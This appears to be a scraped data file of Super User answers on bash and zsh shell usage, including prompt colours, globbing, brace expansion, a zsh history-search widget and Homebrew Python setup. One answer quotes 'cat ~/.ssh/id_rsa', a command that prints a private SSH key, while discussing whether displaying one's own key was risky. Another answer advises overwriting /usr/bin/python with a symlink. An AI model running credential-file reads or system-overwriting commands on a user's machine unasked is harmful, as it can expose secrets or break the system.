466,https://superuser.com/questions554349/,"['You can use iconv to convert the encoding of the file:', 'another.txt should then have the desired encoding.', 'You could also try this:']","[<code>iconv</code>, <code>iconv -f ascii -t utf16 file2.txt &gt; another.txt
</code>, <code>another.txt</code>, <code>echo $var | iconv -f ascii -t utf16 &gt; ""file2.txt""
</code>]"
467,https://superuser.com/questions10634/,"[""This post explains that ~/.bash_profile is used for login shells, while ~/.bashrc is used for other interactive shells. Here's a useful video as well, which gives the example of some printer settings as something you might want on a login shell. In the end, it really doesn't matter too much, it's just a semantics thing. Plus, as the article says:"", '... the point is generally moot because most people edit the files so one calls the other anyway.']","[<code>~/.bash_profile</code>, <code>~/.bashrc</code>]"
468,https://superuser.com/questions1018390/,"['You seem to have worked this out yourself, but you can use:', 'Edit of edit: the below is somewhat wrong, whilst it does run the command in a subshell, it turns out that the environment variables will still be available. Sorry for misleading people...', ""Edit: that will run in a subshell, any unexported environment variables won't be used. If you want to run a command in the same shell, you need to use:"", 'Another answer given is to pipe through bash itself:', 'That will also execute in a subshell, to run in the same shell you will need:', ""Incidentally, you can also use back ticks instead of the $() syntax, but it's not recommended.""]","[<code>$(command parameter1 parameter2)
</code>, <code>eval $(command parameter1 parameter2)
</code>, <code>echo 'uname -a' | bash 
</code>, <code>echo 'uname -a' | bash -c
</code>]"
469,https://superuser.com/questions1068031/,"['The correct substitution is', 'This breaks up as follows:', 'Demonstration:', 'An alternative that may be easier to read would be to quote the pattern and the replacement:']","[<code>home_mf=""${home//\\//}""
</code>, <code>//</code>, <code>\\</code>, <code>/</code>, <code>/</code>, <code>$ t='\a\b\c'; echo ""${t//\\//}""
/a/b/c
</code>, <code>home_mf=""${home//'\'/""/""}""
</code>]"
470,https://superuser.com/questions275262/,"['Create a directory and include it in your $fpath For example, I created a directory ~/.zsh/functions, and the line fpath=($HOME/.zsh/functions $fpath) in my .zshrc.', 'Put the following in a file named history-incremental-multi-search in that directory. ', 'Put this in or source it from your .zshrc:', 'You should now be able to initiate a backward incremental search with Ctrl+X, r, forward with Ctrl+X, s.', 'Type your search terms separated by space. Following keys are available to control it:', '← Backspace: erase character', 'Ctrl+W: erase word', 'Ctrl+U: kill line', 'Ctrl+N: next match', 'Ctrl+P: previous match', 'Ctrl+G/Esc: cancel search', 'Enter: accept', ""This solution can probably be simplified quite a bit. It's more a functional proof of concept, with lots of room for improvement.""]","[<code>history-incremental-multi-search</code>, <code>zsh</code>, <code>$fpath</code>, <code>~/.zsh/functions</code>, <code>fpath=($HOME/.zsh/functions $fpath)</code>, <code>.zshrc</code>, <code>history-incremental-multi-search</code>, <code>emulate -L zsh
setopt extended_glob

local oldbuffer=$BUFFER
local -i oldcursor=$CURSOR

local dir                # search direction
local chars              # input buffer
local -a words           # search terms
local -a found           # all history items that match first term
local -i hindex=$HISTNO  # current 
local -i lmatch          # last matched history item (for prev/next)

if [[ $WIDGET == *forward* ]]; then
    dir=fwd
else
    dir=bck
fi

function find-next {
    # split the input buffer on spaces to get search terms
    words=(${(s: :)chars})

    # if we have at least one search term
    if (( $#words )); then
        # get all keys of history items that match the first
        found=(${(k)history[(R)*$words[1]*]})
        if (( $#found )); then
            # search in widget direction by default
            # but accept exception in $1 for ""prev match""
            search-${1:-$dir}
        else
            # no matches
            lmatch=$HISTNO
        fi
    else
        # no search terms
        lmatch=$HISTNO
        BUFFER=$oldbuffer
        CURSOR=$oldcursor
    fi
}

function search-fwd {
    # search forward through matches
    local -i i
    for (( i = $#found; i &gt; 0; i-- )); do
        # but not before hindex as we're searching forward
        if [[ $found[$i] -gt $hindex ]]; then
            set-match $found[$i]
        fi
    done
}

function search-bck {
    # search backward through matches
    local -i i
    for (( i = 1; i &lt;= $#found; i++ )); do
        # but not beyond hindex as we're searching backward
        if [[ $found[$i] -lt $hindex ]]; then
            set-match $found[$i]
        fi
    done
}

function set-match {
    # match history item against all terms and select it if successful
    local match=1
    local -i i
    for (( i = 2; i &lt;= $#words; i++ )); do
        if [[ $history[$1] != *$words[$i]* ]]; then
            match=0
            break
        fi
    done
    if [[ $match -ne 0 ]]; then
        lmatch=$1
        BUFFER=$history[$1]
        CURSOR=$#BUFFER
        break
    fi
}

# display sub prompt
zle -R ""${dir}-i-search-multi:""

# handle input keys
while read -k; do
    case $REPLY in
        # next
        $'\C-n' )
            hindex=$lmatch
            find-next
            ;;
        # prev
        $'\C-p' )
            hindex=$lmatch
            if [[ $dir == fwd ]]; then
                find-next bck
            else
                find-next fwd
            fi
            ;;
        # break
        $'\e' | $'\C-g' )
            BUFFER=$oldbuffer
            CURSOR=$oldcursor
            break
            ;;
        # accept
        $'\C-m' | $'\C-j' )
            if [[ $lmatch -eq $HISTNO ]]; then
                BUFFER=$oldbuffer
                CURSOR=$oldcursor
            else
                HISTNO=$lmatch
            fi
            break
            ;;
        # erase char
        $'\C-h' | $'\C-?' )
            chars=$chars[1,-2]
            hindex=$HISTNO
            find-next
            ;;
        # erase word
        $'\C-w' )
            if [[ $chars =~ \  ]]; then
                chars=${chars% *}
            else
                chars=
            fi
            hindex=$HISTNO
            find-next
            ;;
        # kill line
        $'\C-u' )
            chars=
            hindex=$HISTNO
            find-next
            ;;
        # add unhandled chars to buffer
        * )
            chars=${chars}${REPLY}
            hindex=$HISTNO
            find-next
            ;;
    esac

    zle -R ""${dir}-i-search-multi: $words""
done
</code>, <code>.zshrc</code>, <code>autoload -U history-incremental-multi-search

# make new widgets from function
zle -N history-incremental-multi-search-backward history-incremental-multi-search
zle -N history-incremental-multi-search-forward history-incremental-multi-search

# bind the widgets to keys
bindkey '^Xr' history-incremental-multi-search-backward
bindkey '^Xs' history-incremental-multi-search-forward
</code>]"
471,https://superuser.com/questions1364748/,"[""It's in the same place."", 'Before the change ~ expands to something like /Users/YourUserName, the shell finds your .bash_profile there. After the file gets sourced ~ expands to another path so ~/.bash_profile no longer points to the relevant file. This is because in this context ~ means $HOME.', 'If you know the full path to your actual home directory, you can use it instead of ~. In Mac it would probably look like this:', ""Or let your Bash look up your home directory in the user database rather than just looking at $HOME. This doesn't require you to remember anything:"", ""Modifying your HOME variable without changing your actual home directory is not the best idea. Changing any user's home directory is an administrative task, usually regular users cannot do this.""]","[<code>~</code>, <code>/Users/YourUserName</code>, <code>.bash_profile</code>, <code>~</code>, <code>~/.bash_profile</code>, <code>~</code>, <code>$HOME</code>, <code>~</code>, <code>nano /Users/YourUserName/.bash_profile
</code>, <code>$HOME</code>, <code>nano ~YourUserName/.bash_profile
</code>, <code>HOME</code>]"
472,https://superuser.com/questions1118683/,"['The remote prompt is set by the remote ~/.bashrc. So you still need to copy it to the remote server. However, you can use a single ~/.bashrc for all hosts, and set the prompt color based on hostname:', 'Notes:', ""Don't set PS1 if it's not already set (i.e., if the shell is not interactive). Testing if PS1 is non-empty is a very common way to decide if the shell is interactive, and you don't want to confuse programs that do that. (Arguably a more accurate test is checking if $- contains i.)"", 'If you want this code to run when logging into a remote server, you should have one of the profile files always source ~/.bashrc. But I assume you know that.', 'In PS1, the escape codes must be enclosed in \\[...\\].', '\\[033[m resets foreground and background to default. So here, :\\w appear in terminal foreground/background.', '\\[033[48;5;XXXm\\033[38;5;YYYm sets the background/foreground to XXX/YYY.', 'For a script that dumps the available colors, try colortest.', 'To check what the prompt would look like:']","[<code>~/.bashrc</code>, <code>~/.bashrc</code>, <code>[ ""$PS1"" ] || return 0                           # continue only when interactive
case $(hostname -s) in
laptop*)
    prompt_color='\033[48;5;16m\033[38;5;46m'    # green(46) on black(16)
    ;;
server*)
    prompt_color='\033[48;5;16m\033[38;5;196m'   # red(196) on black(16)
    ;;
esac
ORIG_PS1=$PS1                                    # in case needed
PS1='&lt;\['${prompt_color}'\]\h\[\033[m\]:\w&gt;\$ '
unset prompt_color
</code>, <code>PS1</code>, <code>PS1</code>, <code>$-</code>, <code>i</code>, <code>~/.bashrc</code>, <code>PS1</code>, <code>\[...\]</code>, <code>\[033[m</code>, <code>:\w</code>, <code>\[033[48;5;XXXm\033[38;5;YYYm</code>, <code>XXX</code>, <code>YYY</code>, <code>colortest</code>, <code>echo -e ""&lt;\033[48;5;16m\033[38;5;196mhost\033[m:dir&gt;$ ""
</code>]"
473,https://superuser.com/questions403263/,"[""Bash's printf command has a feature that'll quote/escape/whatever a string, so as long as both the parent and subshell are actually bash, this should work:"", ""[Edit: as siegi pointed out in a comment, if you do this the obvious way there's a problem when no arguments are supplied, where it acts like there actually was a single empty argument. I've added a workaround below, wrapping the format string with ${1+}, which only includes the format string if the first argument is defined. It's a bit of a kluge, but it does work.]"", 'Note that you can also do it in a single line: bash -c ""other_tool -a -b$(printf ""${1+ %q}"" ""$@"")""']","[<code>printf</code>, <code>${1+}</code>, <code>#!/bin/bash

quoted_args=""$(printf ""${1+ %q}"" ""$@"")"" # Note: this will have a leading space before the first arg
# echo ""Quoted args:$quoted_args"" # Uncomment this to see what it's doing
bash -c ""other_tool -a -b$quoted_args""
</code>, <code>bash -c ""other_tool -a -b$(printf ""${1+ %q}"" ""$@"")""</code>]"
474,https://superuser.com/questions915810/,"['Generally, homebrew will install a formula into /usr/local/Cellar/formula and then place a link at /usr/local/bin/formula.', 'To make use of your installed formulae, make sure /usr/local/bin is in your $PATH. Show your $PATH by typing', 'If /usr/local/bin is not in your $PATH, put this line at the end of your ~/.profile file.', 'Now, check what pythons are found on your OSX by typing:', 'There should be one python found at /usr/bin/ (the Apple python) and one at /usr/local/bin/ which is the Homebrew python.', 'will show you, which python is found first in your $PATH\nand will be executed when you invoke python.', 'If you want to know, where the executable is, show it by typing', 'This could look like this:\n    lrwxr-xr-x  1 root   wheel        68  7 Mai 13:22 python -> /usr/local/bin/python', 'This will work for pip as well.', 'If you show the results of this steps, we can probably help you much easier.', '-- UPDATE --', 'You have /usr/local/bin/python linked to /usr/local/Cellar/python/2.7.9/bin/python. -> brew install python worked.', 'show, if pip is installed by typing', 'You should see', 'If not, check, if there are links, which are not done with brew install. Told you something like this: ', 'To force the link and overwrite all conflicting files:', 'To list all files that would be deleted:', '** NO standard Apple /usr/bin/python **', 'link from /usr/local/Cellar/python/2.7.9/bin/python to /usr/bin/python', 'This is necessary for all python scripts beginning with #!/usr/bin/python. Especialy easy_install will fail, if link is not there.', 'Now, you are able to run', ""Hope, you're making progress""]","[<code>homebrew</code>, <code>formula</code>, <code>/usr/local/Cellar/formula</code>, <code>/usr/local/bin/formula</code>, <code>/usr/local/bin</code>, <code>$PATH</code>, <code>$PATH</code>, <code>echo $PATH
</code>, <code>/usr/local/bin</code>, <code>$PATH</code>, <code>~/.profile</code>, <code>export PATH=""/usr/local/bin:$PATH""
</code>, <code>pythons</code>, <code>which -a python
</code>, <code>/usr/bin/</code>, <code>/usr/local/bin/</code>, <code>which python
</code>, <code>$PATH</code>, <code>python</code>, <code>ls -l $(which python)
</code>, <code>pip</code>, <code>/usr/local/bin/python</code>, <code>/usr/local/Cellar/python/2.7.9/bin/python</code>, <code>brew install python</code>, <code>pip</code>, <code>brew list python | grep pip
</code>, <code>/usr/local/Cellar/python/2.7.9/bin/pip
</code>, <code>brew install</code>, <code>""Error: The `brew link` step did not complete successfully
The formula built, but is not symlinked into /usr/local""
</code>, <code>brew link --overwrite python
</code>, <code>brew link --overwrite --dry-run python
</code>, <code>/usr/bin/python</code>, <code>/usr/local/Cellar/python/2.7.9/bin/python</code>, <code>/usr/bin/python</code>, <code>ln -s /usr/local/Cellar/python/2.7.9/bin/python /usr/bin/python
</code>, <code>#!/usr/bin/python</code>, <code>easy_install</code>, <code>easy_install pip
</code>]"
475,https://superuser.com/questions901183/,"['bash (or whatever you use as shell), is the first thing to read any input, and will start interpreting special characters such as ? and *. * gets expanded to whatever matches in the CWD, which means that the asterisk is substituted by said matches.', 'In most cases, this is fairly straght forward, but can lead to some confusing cases from time to time.', 'Consider the following.\nA directory has this contents:', ""If you then type mv * something seemingly weird happens: test3 is there, but the rest is gone. While weird at first, it makes sense once you understand what bash actually passes to mv. Because of the asterisk, bash interprets mv * as mv test test1 test2 test3, and when mv gets that list, it'll assume that the last arguement is the destination, which is where all of the files would've been moved."", 'As for the commands you listed:']","[<code>?</code>, <code>*</code>, <code>*</code>, <code>mv *</code>, <code>test3</code>, <code>mv</code>, <code>mv *</code>, <code>mv test test1 test2 test3</code>, <code>echo *</code>, <code>ls</code>, <code>echo</code>, <code>cp temp temp*</code>, <code>mv</code>]"
476,https://superuser.com/questions332223/,"['From ""ShellHacks: Bash Colors"":', 'or', '\\033 or \\e as an Escape character starts the escape sequence, which in this case contains the controls to change colors.']","[<code>echo -e ""\033[33mThis is yellow\033[0m""
</code>, <code>echo -e ""\e[33mThis is yellow\e[0m""
</code>, <code>\033</code>, <code>\e</code>]"
477,https://superuser.com/questions452034/,"['In these two cases, all the colors and attributes are reset (0), the foreground color is switched to yellow/brown (33) or cyan (36), then blinking is turned on (5), and then something else also happens (74 or 146) which are probably undefined and not desired.', ""This one's different, because 38 takes additional numeric parameters. It stands for extended foreground color (and similarly 48 would be the same for background), and if followed by a 5 as the next parameter (which doesn't have anything to do with blinking this time) the third number specifies the color's index (from 0 to 255: 16 standard legacy colors, followed by a 6x6x6 RGB cube, followed by 24 grayscale colors), see e.g. here."", 'Certain terminal emulators also support direct arbitrary RGB colors, in that case 38 should be followed by 2, and then by three decimal numbers in the 0-255 range for R, G, B respectively, e.g. #BADA55 is']","[<code>export LESS_TERMCAP_md=$'\E[0;33;5;74m'  # begin bold
export LESS_TERMCAP_us=$'\E[0;36;5;146m' # begin underline
</code>, <code>export LESS_TERMCAP_so=$'\E[38;5;246m'
</code>, <code>\E[38;2;186;218;85m
</code>]"
478,https://superuser.com/questions1323144/,"[""One option is to look at the characters you're trying to use with a hex viewer or editor. hexdump is a good option if you are limited to the terminal."", 'You can see here that the space, close-square-brace, space are correct - 0x20, 0x5D, 0x20.', 'These values are ASCII codes, displayed in hexadecimal. Any value outside the range 0x20 - 0x7E is not a ""printable character"" as far as ASCII is concerned, and most likely won\'t play well with command line interfaces.', 'Note: I copied your first ""broken"" line for use in the hexdump example above, so something has replaced the not-an-ASCII-space with an ASCII space between your original source and your rendered question.', 'To repeat this, take the following steps:', 'Terminals and Command Line Interfaces don\'t handle special characters well - as you have discovered. If you aren\'t very careful with formatting documents, you will also have problems with Microsoft Word (and others) using ""smart quotes"", em-dashes, the list goes on...', 'Spot the difference: (the top is ""smart quotes"", the bottom is ""straight quotes"")', '', 'Here, the open quotes are not a simple ASCII quote (""), but are a Unicode / UTF-8 series - 0xE2, 0x80, 0x9C, or U+201C - which the terminal will not handle as you might expect.', ""Kiwy's suggestion of cat -A also does the job:"", 'Note: when using echo ""..."" | hd, you stand a chance that bash will substitute parts of the string you are trying to inspect. This is particularly of concern when trying to inspect components of a script.', 'For example try:', 'These methods are replacing components with the relevant text. To avoid this, use one of the following approaches. Note the use of single quotes (\'), and a ""quoted heredoc"" (""EOF"").']","[<code>hexdump</code>, <code>$ hexdump -Cv &lt;&lt;""EOF""
&gt; [ -f /etc/openvpn/client.conf ] &amp;&amp; echo true
&gt; EOF
00000000  5b 20 2d 66 20 2f 65 74  63 2f 6f 70 65 6e 76 70  |[ -f /etc/openvp|
00000010  6e 2f 63 6c 69 65 6e 74  2e 63 6f 6e 66 20 5d 20  |n/client.conf ] |
00000020  26 26 20 65 63 68 6f 20  74 72 75 65 0a           |&amp;&amp; echo true.|
0000002d
</code>, <code>space</code>, <code>close-square-brace</code>, <code>space</code>, <code>0x20</code>, <code>0x5D</code>, <code>0x20</code>, <code>0x20</code>, <code>0x7E</code>, <code>hexdump</code>, <code>hexdump -Cv &lt;&lt;""EOF""</code>, <code>EOF</code>, <code>$ hexdump -Cv &lt;&lt;""EOF""
&gt; “quoted string”
&gt; EOF
00000000  e2 80 9c 71 75 6f 74 65  64 20 73 74 72 69 6e 67  |...quoted string|
00000010  e2 80 9d 0a                                       |....|
00000014
</code>, <code>""</code>, <code>0xE2</code>, <code>0x80</code>, <code>0x9C</code>, <code>U+201C</code>, <code>cat -A</code>, <code>$ cat -A &lt;&lt;""EOF""
&gt; “quoted string”
&gt; EOF
M-bM-^@M-^\quoted stringM-bM-^@M-^]$
</code>, <code>echo ""..."" | hd</code>, <code>$ echo ""${USER}""
attie

$ echo ""`whoami`""
attie

$ echo ""$(whoami)""
attie

$ cat &lt;&lt;EOF
&gt; ${USER}
&gt; EOF
attie
</code>, <code>'</code>, <code>""EOF""</code>, <code>$ echo '${USER}'
${USER}

$ echo '`whoami`'
`whoami`

$ echo '$(whoami)'
$(whoami)

$ cat &lt;&lt;""EOF""
&gt; ${USER}
&gt; EOF
${USER}
</code>]"
479,https://superuser.com/questions645799/,"['sed supports pattern ranges in this form:', 'For example:']","[<code>sed</code>, <code>sed '/startpattern/,/endpattern/ &lt;sed-commands&gt;' file
</code>, <code>sed '/&lt;Directory \/var\/www\/&gt;/,/&lt;\/Directory&gt;/ s/AllowOverride None/AllowOverride all/' httpd.conf
</code>]"
480,https://superuser.com/questions584540/,"[""Don't forget it is a hidden file inside your home directory (you would not be the first to do a ls -l and thinking it is not there)."", 'Do following ...', 'There should be a .bashrc on the first page. If not just create it with', 'And simply write following line into it.', 'OR\nMost of the distributions keep a standard .bashrc file in /etc/skel/ You can copy it to home directory.']","[<code>ls -l</code>, <code>ls -la ~/ | more
</code>, <code>.bashrc</code>, <code>vi ~/.bashrc
</code>, <code>PATH=$PATH:~/bin
</code>, <code>.bashrc</code>, <code>/etc/skel/</code>, <code>$cp /etc/skel/.bashrc ~
</code>]"
481,https://superuser.com/questions881463/,"['$PATH is a variable, which I am sure you\'re aware of. When that variable is resolved, it would be the same as typing in :/home/bo/bin:/usr/local/bin:/usr/sbin:/usr/local/sbin:/usr/bin:/sbin:/bin: and expecting something to happen. The reason echo $PATH works is because you\'re explicitly piping it out to the display rather than telling the terminal to ""do"" $PATH.']","[<code>$PATH</code>, <code>:/home/bo/bin:/usr/local/bin:/usr/sbin:/usr/local/sbin:/usr/bin:/sbin:/bin:</code>, <code>echo $PATH</code>, <code>$PATH</code>]"
482,https://superuser.com/questions652837/,"['The ssh command will allow you to execute pretty much any command on the remote host, e.g.,', 'where in this example somedir is relative to the home directory of yourlogin.']","[<code>ssh</code>, <code>ssh yourlogin@remotehost rmdir somedir
</code>, <code>somedir</code>]"
483,https://superuser.com/questions598374/,"[""What you basically want to do is change the resolution of the framebuffer. Here's the process I used (supposing that your desired resolution is 1024x768, and that Hyper-V's framebuffer supports this resolution):"", 'GRUB_GFXMODE=1024x768x32\n  GRUB_GFXPAYLOAD_LINUX=keep']","[<code>/etc/default/grub</code>, <code>sudo nano /etc/default/grub</code>, <code>update-grub</code>, <code>sudo update-grub</code>]"
484,https://superuser.com/questions299394/,"['You could simply add the following command into System > Preferences > Startup Applications:', 'That should do the trick ;)']","[<code>bash /full/path/to/your/script.sh
</code>]"
485,https://superuser.com/questions48480/,"[""The following seems to work, but I'm not sure how robust it is:"", ""It doesn't work if your Location uses a proxy.pac instead of a hard-coded proxy location.""]","[<code>system_profiler SPNetworkDataType|grep ""HTTP Proxy Server""|awk {'sub(/^.*:[ \t]*/, """", $0); print $0;'}
</code>, <code>proxy.pac</code>]"
486,https://superuser.com/questions561451/,"['I know of https://github.com/mgalgs/fuzzy_bash_completion which is a bunch of shell functions used with complete.', 'I think we could probably do a little better though, be more concise. Time to bust open your .bashrc or .profile...', 'The basic hook we use is this:', 'complete -o nospace -o filenames -F fuzzypath cd ls cat', '-F option means use a shell function for the tab-completion, where the options are set in the COMPREPLY variable. So for example:', ""where DIRPATH is everything before the last / on your path that you're typing and BASENAME is where your cursor is currently. "", 'FILTER is where the fuzzy-ness comes in. Basically, take BASENAME and insert a .* between every char to produce our fuzz regex.', 'The rest is just combining the regex with ls to produce COMPREPLY. You may find more clever things to do here, maybe with find.', 'I also found http://fahdshariff.blogspot.com/2011/04/writing-your-own-bash-completion.html to be useful.']","[<code>complete</code>, <code>complete -o nospace -o filenames -F fuzzypath cd ls cat</code>, <code>COMPREPLY</code>, <code>DIRPATH</code>, <code>BASENAME</code>, <code>FILTER</code>, <code>BASENAME</code>, <code>.*</code>, <code>COMPREPLY</code>, <code>find</code>]"
487,https://superuser.com/questions380338/,"[""Since you said it's not always exactly 21 files than you need to move the files manually, and to do that effectively you could use brace expansion:""]","[<code>mv filename{001..21} dir1
mv filename{022..53} dir2
...
</code>]"
488,https://superuser.com/questions276531/,"[""I don't think there is a way to clear stdin but (with bash) you can read and discard what is there before you ask for the input"", ""This reads stdin and has a timeout of 1 second, it fails though if there are more than 10000 chars in stdin. I don't know how big you can make the nchars parameter.""]","[<code>#do some time consuming task here
read -t 1 -n 10000 discard 
read -p ""Give me some input: "" input
</code>]"
489,https://superuser.com/questions587858/,"['You can use brace expansion:', 'Leading zeros can be included if necessary:']","[<code>ls mjk00{25..50}.fits
</code>, <code>ls mjk0{000..149}.fits
</code>]"
490,https://superuser.com/questions188477/,"['From Bash FAQ E10:', ""E10) Why does 'cd //' leave $PWD as '//'?"", ""POSIX.2, in its description of 'cd', says that three or more leading\n  slashes may be replaced with a single slash when canonicalizing the\n  current working directory."", ""This is, I presume, for historical compatibility.  Certain versions of\n  Unix, and early network file systems, used paths of the form\n  //hostname/path to access 'path' on server 'hostname'.""]",[]
491,https://superuser.com/questions38895/,"['For being Finder friendly, a bash script must have the .command suffix. Of course it must be executable as well.']",[<code>.command</code>]
492,https://superuser.com/questions707687/,"[""If you did this in private, there's no problem. Think about it – you only displayed on screen the exact same data that is already stored on your harddisk anyway. And if anyone could access your scrollback or your history, they could just as well read the id_rsa file directly."", ""Besides, your shell's history – even if it was readable to other users (which it isn't) – only contains commands, not their output. So all it'll have is a line with cat\xa0~/.ssh/id_rsa in it."", ""The scrollback history, for most terminals, is stored entirely in memory. (libvte-based terminals sometimes use a backing file in /tmp, but that's either a tmpfs or is located in the same disk as your ~/.ssh, anyway...) So it becomes irrelevant once you close the terminal.\nAnd either way it is only accessible to you, of course."", 'And very often, the private key itself is encrypted with a passphrase and is unusable unless you decrypt it when ssh asks to.', 'Unless, of course, you did this in the presence of high-resolution security cameras, or even outright allowed someone to snap a photo of your terminal window. In that case, someone could retype the key from photos, and the only thing protecting it would be the encryption passphrase.']","[<code>id_rsa</code>, <code>cat ~/.ssh/id_rsa</code>, <code>ssh</code>]"
493,https://superuser.com/questions813472/,"['Closing File Descriptors', 'n<&- Close input file descriptor n. ', '0<&- or <&- Close stdin.', 'Source Chapter 20. I/O Redirection']","[<code>n&lt;&amp;-</code>, <code>0&lt;&amp;-</code>, <code>&lt;&amp;-</code>]"
494,https://superuser.com/questions421701/,"['The problem is that both read line and read response expects (and gets) data from stdin.\nThis question on SO explains some of it with a link to even more information.', 'tl;dr\nThe accepted answer suggests:', 'Read from the controlling terminal device: read input </dev/tty']","[<code>read line</code>, <code>read response</code>, <code>stdin</code>, <code>read input &lt;/dev/tty</code>]"
495,https://superuser.com/questions378477/,"[""I turned out to be a mismatch between Virtualenv's activate.sh file and MSYSGIT. It was never intended to work on Windows.""]",[<code>activate.sh</code>]
496,https://superuser.com/questions183794/,['The easiest way is to use a chroot jail containing only the commands you want the script to be able to run. You then run the script through a wrapper that calls chroot into the directory and then executes the script.'],[<code>chroot</code>]
497,https://superuser.com/questions865548/,"['On Linux, add | tac at the end of your line.']",[<code>| tac</code>]
498,https://superuser.com/questions414465/,"['> is for redirecting to a file (overwriting it), while >> is for appending.', 'To overwrite bar.txt, use this:']","[<code>&gt;</code>, <code>&gt;&gt;</code>, <code>bar.txt</code>, <code>echo ""foo"" &gt; bar.txt
</code>]"
499,https://superuser.com/questions1242106/,"['*\\:2,*T is the glob pattern of files to list. To understand it, we need to remember a few things:', 'So *\\:2,*T would e.g. match a file called TranscationNumber:2,EventType:XYT', 'EDIT', 'From the comments, the necessity (or not) of escaping the : needs a few words: It is not strictly necessary to escape the : sign, but bash itself suggests it when autocompleting.']","[<code>*\:2,*T</code>, <code>:</code>, <code>\:</code>, <code>*\:2,*T</code>, <code>TranscationNumber:2,EventType:XYT</code>, <code>:</code>, <code>:</code>]"
